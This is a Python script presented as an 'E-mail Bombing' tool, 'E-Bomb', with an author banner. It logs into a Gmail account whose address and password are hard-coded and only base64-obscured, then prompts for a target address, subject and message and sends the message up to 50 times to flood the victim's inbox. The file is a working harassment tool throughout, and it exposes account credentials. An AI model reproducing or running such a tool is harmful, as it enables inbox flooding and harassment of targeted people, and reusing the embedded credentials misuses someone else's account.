import smtplib
import sys
import os
import time
import base64

encoded_email = "cmF5aGFua2hhbjR1QGdtYWlsLmNvbQ=="
encoded_pass = "andjdHl1c2Zlanhyemt0eg=="
sender_email = base64.b64decode(encoded_email.encode()).decode()
sender_pass = base64.b64decode(encoded_pass.encode()).decode()


def x(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()



RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'


try:
    os.system("clear")
    time.sleep(1)
    x(f"\n\t\t{CYAN}Connecting to the server...{RESET}")
    time.sleep(3)
    os.system("clear")
    a = smtplib.SMTP("smtp.gmail.com", 587)
    a.ehlo()
    a.starttls()
    a.login(sender_email, sender_pass)
    print(f"\t\t\t{GREEN}✔ Login successful!{RESET}\n")
except Exception as e:
    print(f"{RED}❌ Failed to connect or login to the server: {e}{RESET}")
    sys.exit()



print("""\033[1;32m


    ______     ____                  __  
   / ____/    / __ )____  ____ ___  / /_ 
  / __/______/ __  / __ \\/ __ `__ \\/ __ \\
 / /__/_____/ /_/ / /_/ / / / / / / /_/ /
/_____/    /_____/\\____/_/ /_/ /_/_.___/                                      
\033[1;31m================================================================
    \033[1;34mTools Author: \033[1;33mMohammad Rayhan Khan 
    \033[1;34mVersion     : \033[1;33m1.0
    \033[1;34mTool Name   : \033[1;33mE-mail Bombing
    \033[1;34mFacebook    : \033[1;33mhttps://www.facebook.com/azad.farabi.2024
    \033[1;34mGithub      : \033[1;33mhttps://github.com/lucifer-fernandez/E-BOMB.git
\033[1;31m================================================================
""")








try:
    print(f"\033[1;35m_" * 60)

    target = input(f"\n{CYAN}➤ Enter your Target Email: {YELLOW}").strip()
    if not target:
        raise ValueError("Target email cannot be empty.")

    sub = input(f"{CYAN}➤ Enter your Email Subject: {YELLOW}").strip()
    if not sub:
        raise ValueError("Subject cannot be empty.")

    msg = input(f"{CYAN}➤ Enter the Message you want to send: {YELLOW}").strip()
    if not msg:
        raise ValueError("Message cannot be empty.")

except ValueError as ve:
    print(f"{RED}❌ Error: {ve}")

except Exception as e:
    print(f"{RED}❌ Unexpected Error: {e}") 


try:
    amount = int(input(f"{CYAN}➤ Enter total amount of Email you want to send (1-50): {YELLOW}"))
    print("\033[1;35m_"*60)
    if amount < 1 or amount > 50:
        print(f"{RED}❌ Invalid amount! Please enter a number between 1 and 50.{RESET}")
        a.quit()
        sys.exit()
except ValueError:
    print(f"{RED}❌ Invalid input! Please enter a number only.{RESET}")
    a.quit()
    sys.exit()


full_message = f"Subject: {sub}\n\n{msg}"

x(f"\n\n{CYAN}>>>>>>>>>> Sending {amount} email(s) to {target}...{RESET}\n")
for i in range(amount):
    try:
        a.sendmail(sender_email, target, full_message)
        print(f"{GREEN}✔ Email {i+1}/{amount} sent successfully to {target}{RESET}")
    except Exception as e:
        print(f"{RED}❌ Failed to send email {i+1}: {e}")
    time.sleep(1)

a.quit()
x(f"\n\t\t{GREEN}✔ All done! Connection closed.{RESET}")
